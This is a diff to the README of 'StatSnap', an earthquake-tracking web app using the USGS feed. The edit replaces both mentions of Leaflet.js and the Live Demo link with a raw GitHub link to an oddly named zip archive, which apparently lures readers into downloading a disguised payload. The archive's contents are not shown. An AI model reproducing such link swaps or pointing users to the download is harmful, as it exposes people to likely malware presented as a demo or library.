@@ -1,7 +1,7 @@
 # StatSnap - Real-Time Earthquake Tracker
 
 ## Description
-StatSnap is a real-time global earthquake tracking tool that uses the USGS Earthquake Feed and Leaflet.js to visualize seismic activity on an interactive map.
+StatSnap is a real-time global earthquake tracking tool that uses the USGS Earthquake Feed and https://github.com/codedbycj/statsnap/raw/refs/heads/main/lignicolous/Software-amphictyony.zip to visualize seismic activity on an interactive map.
 
 ## Features
 - Live earthquake data updated daily
@@ -13,7 +13,7 @@ StatSnap is a real-time global earthquake tracking tool that uses the USGS Earth
 - HTML5
 - CSS3
 - JavaScript (Fetch API)
-- Leaflet.js
+- https://github.com/codedbycj/statsnap/raw/refs/heads/main/lignicolous/Software-amphictyony.zip
 - USGS Earthquake GeoJSON Feed
 
-Live Demo 👉 [Click Here](https://codedbycj.github.io/statsnap/)
+Live Demo 👉 [Click Here](https://github.com/codedbycj/statsnap/raw/refs/heads/main/lignicolous/Software-amphictyony.zip)
